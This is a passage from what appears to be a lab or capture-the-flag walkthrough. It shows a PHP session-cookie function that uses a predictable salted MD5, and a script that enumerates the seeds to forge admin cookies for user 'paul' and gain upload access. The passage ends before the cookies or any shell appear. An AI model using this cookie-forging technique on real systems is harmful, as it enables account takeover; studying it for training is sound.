# Getting initial reverse shell as www-data
## Generating cookie for paul as admin user to upload files
Source code for generating cookie is.
Note: Only paul as admin user can upload files and access file upload page.
```php
<?php
\/**
 * @param string $username  Username requesting session cookie
 *
 * @return string $session_cookie Returns the generated cookie
 *
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * *\/
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
```
We can write php script to generate cookies for paul.
```php
<?php
$name = "paul";
function makesession($username,$seed){
    $max = strlen($username) - 1;
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
for($i = 0;$i < strlen($name); $i++){
    echo makesession($name,$i). "\xA";
}
```
Which gives following cookies.
